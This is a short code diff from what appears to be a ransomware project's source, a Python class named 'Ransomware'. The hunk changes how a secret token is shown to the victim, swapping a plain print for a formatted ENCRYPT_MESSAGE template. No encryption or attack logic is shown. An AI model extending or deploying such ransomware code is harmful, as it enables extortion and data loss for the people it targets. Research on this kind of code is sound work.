@@ -106,7 +106,7 @@ class Ransomware:
 
         # print token to the user
         hex_token = secret_manager.get_hex_token()
-        print(f"Remember, your token is: {hex_token}")
+        print(ENCRYPT_MESSAGE.format(token=hex_token))
 
         while True:
             try:
